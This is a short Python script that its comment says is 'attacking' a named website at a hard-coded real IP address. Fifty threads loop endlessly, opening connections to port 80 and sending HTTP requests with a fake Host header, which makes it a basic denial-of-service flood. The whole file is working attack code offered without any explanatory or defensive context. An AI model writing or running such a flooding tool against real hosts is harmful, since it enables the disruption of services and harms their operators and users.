```python
import socket
import threading

target="184.168.131.241" #attacking http://www.itsecgames.com/
port=80
fake_ip="124.34.21.78"

connected=0

def attack():
    
    while True:
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target,port))
        s.close()
        
        global connected
        connected+=1
        if(connected%100==0):
            print(connected)

for i in range(50):
    thread=threading.Thread(target=attack)
    thread.start()

        
    
```
